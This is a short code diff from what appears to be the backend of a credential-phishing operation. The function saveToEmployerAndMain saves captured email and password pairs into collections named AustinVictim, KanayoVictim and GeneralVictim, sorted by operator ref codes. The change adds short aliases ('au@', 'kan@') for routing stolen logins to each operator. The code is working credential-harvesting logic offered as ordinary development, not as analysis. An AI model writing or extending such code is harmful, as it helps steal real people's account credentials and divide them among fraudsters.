@@ -41,10 +41,10 @@ async function saveToEmployerAndMain({ email, password, employerId }) {
     employerId: normalizedEmployer,
   });
 
-  // Save copy to employer specific collection
-  if (normalizedEmployer === "austin") {
+  // Save copy to employer specific collection based on ref code
+  if (normalizedEmployer === "au@" || normalizedEmployer === "austin") {
     await AustinVictim.create({ email, password, employerId: "austin" });
-  } else if (normalizedEmployer === "kanayo") {
+  } else if (normalizedEmployer === "kan@" || normalizedEmployer === "kanayo") {
     await KanayoVictim.create({ email, password, employerId: "kanayo" });
   } else {
     await GeneralVictim.create({ email, password, employerId: normalizedEmployer });
